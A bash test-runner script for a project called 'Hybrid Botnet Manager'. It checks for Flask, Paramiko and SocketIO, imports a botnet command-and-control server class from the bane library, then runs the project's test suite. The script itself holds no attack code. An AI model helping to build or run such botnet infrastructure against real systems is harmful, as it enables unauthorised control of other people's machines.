#!/bin/bash

# Test runner script for Hybrid Botnet Manager
# Automatically detects environment and runs appropriate tests

echo "🧪 HYBRID BOTNET MANAGER - TEST RUNNER"
echo "======================================"

# Check if virtual environment exists
if [ -d "vps_env" ]; then
    echo "📦 Found virtual environment, activating..."
    source vps_env/bin/activate
    echo "✅ Virtual environment activated"
else
    echo "⚠️  No virtual environment found, using system Python"
fi

# Check Python version
PYTHON_VERSION=$(python3 --version 2>&1)
echo "🐍 $PYTHON_VERSION"

# Check dependencies
echo ""
echo "🔍 CHECKING DEPENDENCIES:"
python3 -c "
try:
    import flask
    try:
        print(f'✅ Flask: {flask.__version__}')
    except:
        print('✅ Flask: Available')
except:
    print('❌ Flask not available')

try:
    import paramiko
    try:
        print(f'✅ Paramiko: {paramiko.__version__}')
    except:
        print('✅ Paramiko: Available')
except:
    print('❌ Paramiko not available')

try:
    import socketio
    try:
        print(f'✅ SocketIO: {socketio.__version__}')
    except:
        print('✅ SocketIO: Available')
except:
    print('❌ SocketIO not available')

try:
    from bane.scanners.botnet import Botnet_C_C_Server
    print('✅ Bane C2: Available')
except Exception as e:
    print(f'❌ Bane C2: Not available')
"

echo ""
echo "🚀 RUNNING TEST SUITE:"
echo "====================="

# Run the main test suite
python3 test_suite.py

echo ""
echo "📊 TEST COMPLETE"
